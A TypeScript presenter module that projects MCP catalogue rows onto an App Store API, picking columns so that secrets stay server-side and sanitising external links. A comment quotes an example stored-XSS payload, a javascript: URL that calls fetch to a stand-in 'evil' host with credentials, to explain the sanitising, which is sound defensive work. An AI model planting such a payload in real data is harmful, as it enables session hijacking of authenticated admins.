import { sanitizeHttpUrl } from '@nessie/schemas'
import type {
  AppCapabilities,
  AppCategory,
  AppConnectionStatus,
  AppConnectionSummaryRecord,
  AppDetailRecord,
  AppDistribution,
  AppAgentAccessRecord,
  AppSource,
  AppSummaryRecord,
  AppAuthMethod,
  AppTrustLevel,
  McpCatalogStatus,
  McpCatalogVisibility,
} from '@nessie/schemas'

import { isManagedIntegrationCatalogRecord } from '../managed-products.js'
import { deriveAppCardState } from './app-card-state.js'
import { appIconIsResolvable } from './app-icon-resolve.js'

/**
 * The projection of an `McpCatalogEntry` onto the App Store wire contract.
 *
 * Two independent guarantees keep a secret out of `/api/apps`, because one is
 * a habit and two is a rule:
 *
 * 1. `STORE_CATALOG_SELECT` is the only column list a store read may use. It
 *    names no `authConfig`, `defaultTransportConfig`, `sourceUrl`,
 *    `signature`, or credential-bearing field. It retains `iconUrl` solely as
 *    a private "one declared icon exists" signal for lazy local resolution.
 * 2. Every record below is assembled field by field. Nothing spreads a row, so
 *    a column added to the catalogue later cannot ride out on the wire by
 *    default. This mirrors `api/src/routes/mcp/catalog-response.ts`, which
 *    redacts because it must return the whole connector row; the store never
 *    needs the whole row, so it declines to load it.
 *
 * `iconUrl` is a Nessie-served path or nothing. The upstream
 * `mcp_catalog_entries.icon_url` is provenance only: rendering it would have
 * every member's browser announce itself to a third-party host — and fetch
 * untrusted SVG — the moment the store opens.
 */

export const STORE_CATALOG_SELECT = {
  id: true,
  // Internal-only curation identity. The presenter does not emit it.
  registryName: true,
  name: true,
  label: true,
  description: true,
  slug: true,
  displayName: true,
  shortDescription: true,
  longDescription: true,
  vendor: true,
  websiteUrl: true,
  documentationUrl: true,
  repositoryUrl: true,
  // Never emitted: this only tells `appIconUrl` whether its local resolver has
  // a publisher-declared candidate when the app has no website.
  iconUrl: true,
  iconAttachmentId: true,
  iconResolvedAt: true,
  primaryCategory: true,
  categories: true,
  tags: true,
  aliases: true,
  trustLevel: true,
  distribution: true,
  // The auth METHOD only — never `authConfig`, which holds the client id and
  // any static secret. A person deserves to know "this will open a sign-in"
  // versus "this needs a key" BEFORE they press Connect, and that is one enum
  // value; the configuration behind it stays server-side like every other
  // credential fact this presenter refuses to emit.
  authMethod: true,
  appSource: true,
  featured: true,
  featuredOrder: true,
  toolCount: true,
  resourceCount: true,
  promptCount: true,
  locked: true,
  status: true,
  // Read by `isManagedIntegrationCatalogRecord`, never rendered.
  visibility: true,
  organizationId: true,
  integratedProducts: { select: { slug: true } },
} as const

export type StoreCatalogRow = {
  id: string
  registryName: string | null
  name: string
  label: string
  description: string
  slug: string | null
  displayName: string | null
  shortDescription: string | null
  longDescription: string | null
  vendor: string | null
  websiteUrl: string | null
  documentationUrl: string | null
  repositoryUrl: string | null
  /** Raw upstream URL; presenter-only and never part of the wire contract. */
  iconUrl: string | null
  iconAttachmentId: string | null
  iconResolvedAt: Date | null
  primaryCategory: AppCategory
  categories: AppCategory[]
  tags: string[]
  aliases: string[]
  trustLevel: AppTrustLevel
  distribution: AppDistribution
  authMethod: AppAuthMethod
  appSource: AppSource
  featured: boolean
  featuredOrder: number | null
  toolCount: number | null
  resourceCount: number | null
  promptCount: number | null
  locked: boolean
  status: McpCatalogStatus
  visibility: McpCatalogVisibility
  organizationId: string | null
  integratedProducts: Array<{ slug: string }>
}

export type AppPresentationContext = {
  connectionStatuses: readonly AppConnectionStatus[]
  serverUnreachable: boolean
}

/** Where the icon bytes are served from once one has been cached locally. */
/**
 * Where the client asks for this app's icon, or null for a monogram.
 *
 * The path is named whenever an icon is *still possible*, not only when one is
 * already cached: the route resolves lazily on first view, so naming it only
 * for cached rows would mean nothing ever got a first view. A row whose
 * resolution has already been attempted and found nothing goes back to null,
 * which is what stops the grid re-asking on every paint.
 */
export const appIconUrl = (row: StoreCatalogRow): string | null =>
  appIconIsResolvable(row) ? `/api/apps/${row.id}/icon` : null

/**
 * The primary action still lands on the existing Connectors install path: the
 * universal connect flow is a later phase, and the server names the
 * destination so no surface assembles a URL of its own. It rides on the
 * *summary*, so the grid's buttons and the detail hero's are the same link.
 */
export const appInstallHref = (row: StoreCatalogRow): string =>
  `/mcp-app-store?catalogEntryId=${encodeURIComponent(row.id)}&action=install`

export const presentAppSummary = (
  row: StoreCatalogRow,
  context: AppPresentationContext,
): AppSummaryRecord => ({
  id: row.id,
  slug: row.slug,
  name: row.name,
  displayName: row.displayName ?? row.label,
  shortDescription: row.shortDescription ?? row.description,
  vendor: row.vendor,
  iconUrl: appIconUrl(row),
  primaryCategory: row.primaryCategory,
  categories: row.categories,
  tags: row.tags,
  aliases: row.aliases,
  trustLevel: row.trustLevel,
  distribution: row.distribution,
  authMethod: row.authMethod,
  appSource: row.appSource,
  featured: row.featured,
  featuredOrder: row.featuredOrder,
  toolCount: row.toolCount,
  resourceCount: row.resourceCount,
  promptCount: row.promptCount,
  managedByIntegration: isManagedIntegrationCatalogRecord(
    row,
    row.integratedProducts.map((product) => product.slug),
  ),
  locked: row.locked,
  connectionCount: context.connectionStatuses.length,
  installHref: appInstallHref(row),
  state: deriveAppCardState(
    {
      blocked: row.trustLevel === 'blocked',
      deprecated: row.status === 'deprecated',
      locked: row.locked,
      serverUnreachable: context.serverUnreachable,
    },
    context.connectionStatuses,
  ),
})

export type CapabilityRow = {
  label: string
  description: string
}

/**
 * What the app can do, in the store's vocabulary. The human label is the
 * capability's name here — the registry `toolId` is `mcp:<instanceId>:<tool>`,
 * and an instance id is one of the things this surface must never render.
 * Two accounts of the same app project the same tools, so identical labels
 * collapse to one row.
 */
export const presentAppCapabilities = (
  rows: readonly CapabilityRow[],
): AppCapabilities => {
  const byLabel = new Map<string, string>()
  for (const row of rows) {
    if (!byLabel.has(row.label)) byLabel.set(row.label, row.description)
  }
  return {
    tools: [...byLabel.entries()]
      .map(([name, description]) => ({ name, description }))
      .sort((a, b) => a.name.localeCompare(b.name)),
  }
}

export type AppDetailContext = AppPresentationContext & {
  agentsWithAccess: AppAgentAccessRecord[]
  capabilities: AppCapabilities
  connections: AppConnectionSummaryRecord[]
}

/**
 * `websiteUrl`, `documentationUrl` and `repositoryUrl` are rendered as `href`
 * on the detail page, and their delivery vector is a registry record nobody
 * wrote by hand: `javascript:fetch('https://evil',{credentials:'include'})` in
 * `websiteUrl` is stored XSS in an authenticated admin origin. Ingestion
 * refuses such a value on the way in (`registry/registry-mapper.ts`) and the
 * wire schema constrains it; the same `sanitizeHttpUrl` refuses it on the way
 * out, because rows already in the table predate both gates and the connector
 * catalog surface writes the same three columns. An unparseable or relative
 * value is dropped rather than repaired — a link this surface cannot vouch for
 * is a link it does not offer.
 */
export const presentAppDetail = (
  row: StoreCatalogRow,
  context: AppDetailContext,
): AppDetailRecord => ({
  ...presentAppSummary(row, context),
  longDescription: row.longDescription,
  websiteUrl: sanitizeHttpUrl(row.websiteUrl),
  documentationUrl: sanitizeHttpUrl(row.documentationUrl),
  repositoryUrl: sanitizeHttpUrl(row.repositoryUrl),
  capabilities: context.capabilities,
  connections: context.connections,
  agentsWithAccess: context.agentsWithAccess,
})
